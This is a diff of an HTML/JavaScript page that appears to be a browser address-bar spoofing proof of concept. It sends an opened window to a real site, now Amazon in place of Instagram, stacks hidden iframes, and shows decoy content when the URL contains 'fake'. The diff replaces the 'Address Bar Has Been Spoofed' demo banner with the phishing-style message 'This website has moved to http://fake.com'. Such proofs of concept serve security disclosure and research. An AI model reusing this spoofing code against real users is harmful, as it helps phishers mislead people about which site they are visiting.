@@ -1,5 +1,6 @@
+
 <body>
-<a id=test href="https://www.instagram.com/" onclick=foo()>https://www.instagram.com/</a>
+<a id=test href="https://www.amazon.com/" onclick=foo()>https://www.amazon.com/</a>
 </body>
 
 <script>
@@ -9,7 +10,7 @@ var t;
 var z;
 
 if(location.href.indexOf("fake") !== -1){
-document.body.innerHTML = "<h1>Address Bar Has Been Spoofed</h1>";
+document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
 }
 
 
@@ -33,7 +34,7 @@ document.body.innerHTML = "<h1>Redirecting</h1>";
 
 slow();
 
-w.location.href = 'https://www.instagram.com/';
+w.location.href = 'https://www.amazon.com/';
 
 clearInterval(t);
 
@@ -65,7 +66,7 @@ function slow() {
 for (i=0; i<10; i++ ) {
 
 iframe = document.createElement("iframe");
-iframe.src = 'https://www.instagram.com/';
+iframe.src = 'https://www.amazon.com/';
 iframe.style = 'display:none';
 document.body.appendChild(iframe);
 
